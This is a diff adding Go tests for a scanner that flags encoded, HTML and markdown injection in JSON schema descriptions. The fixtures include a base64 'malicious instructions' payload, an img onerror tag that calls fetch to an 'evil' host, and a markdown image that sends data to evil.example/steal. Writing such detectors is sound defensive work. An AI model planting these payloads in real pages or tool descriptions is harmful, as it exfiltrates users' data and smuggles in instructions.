@@ -77,6 +77,41 @@ func TestScanDetectsZeroWidth(t *testing.T) {
 	}
 }
 
+func TestScanDetectsEncodedHTMLMarkdown(t *testing.T) {
+	cases := []struct {
+		name string
+		desc string
+		want FindingKind
+	}{
+		{"base64", "payload: TWFsaWNpb3VzIGluc3RydWN0aW9ucyBnbyBoZXJlIGFuZCBrZWVwIGdvaW5n+/==", KindEncodedPayload},
+		{"html", "Look at <img src=x onerror=fetch('http://evil')>", KindHTMLInjection},
+		{"markdown", "See ![logo](https://evil.example/steal?c=1)", KindMarkdownInjection},
+	}
+	for _, c := range cases {
+		s := `{"properties":{"x":{"description":"` + c.desc + `"}}}`
+		f := Scan("t", json.RawMessage(s))
+		found := false
+		for _, x := range f {
+			if x.Kind == c.want {
+				found = true
+			}
+		}
+		if !found {
+			t.Errorf("%s: expected %s, got %+v", c.name, c.want, f)
+		}
+	}
+}
+
+func TestHexHashIsNotFlaggedAsBase64(t *testing.T) {
+	// A 64-char hex sha256 has no +/= and must not be a false positive.
+	s := `{"properties":{"x":{"description":"baseline 9f4c1b2a3d4e5f60718293a4b5c6d7e8f9001122334455667788990011223344"}}}`
+	for _, x := range Scan("t", json.RawMessage(s)) {
+		if x.Kind == KindEncodedPayload {
+			t.Errorf("hex hash false-positived as encoded payload: %+v", x)
+		}
+	}
+}
+
 func TestHashStableUnderKeyReorder(t *testing.T) {
 	a := `{"a":1,"b":2}`
 	b := `{"b":2,"a":1}`
